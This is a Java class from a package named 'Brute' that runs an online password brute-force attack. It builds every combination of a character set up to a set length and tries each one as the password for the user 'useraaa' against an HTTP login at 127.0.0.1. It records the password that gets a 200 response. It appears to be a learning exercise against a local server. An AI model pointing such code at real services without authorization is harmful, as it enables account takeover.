package Brute;

/**
 * Created by Michael on 07.10.2015.
 */
public class ThreadsBrute implements Runnable {
    String[] testVal;
    int ind;

    public ThreadsBrute(String[] testVal, int ind) {
        this.testVal = testVal;
        this.ind = ind;
    }

    public void writerPassword(String text) {
        String fileName = "out/password.txt";
        FileWorker.write(fileName, text);
    }

    @Override
    public void run() {
        ClientAuthentication clientAuthentication = new ClientAuthentication();

        for (String pass : getAllLists(testVal, ind))
        {
            if (clientAuthentication.Authenticate("http://127.0.0.1:80//AAA", "useraaa", pass, "out/index.txt") == 200)
            {
                System.out.println("Password Found: " + pass);
                writerPassword("Server password: " + pass);
                break;
            } else {
                System.out.println("Pass test: " + pass);
            }
        }
    }

    public static String[] getAllLists(String[] elements, int lengthOfList)
    {
        String[] allLists = new String[(int)Math.pow(elements.length, lengthOfList)];

        if(lengthOfList == 1) return elements;
        else
        {
            String[] allSublists = getAllLists(elements, lengthOfList - 1);

            int arrayIndex = 0;

            for(int i = 0; i < elements.length; i++)
            {
                for(int j = 0; j < allSublists.length; j++)
                {
                    allLists[arrayIndex] = elements[i] + allSublists[j];
                    arrayIndex++;
                }
            }

            return allLists;
        }
    }
}
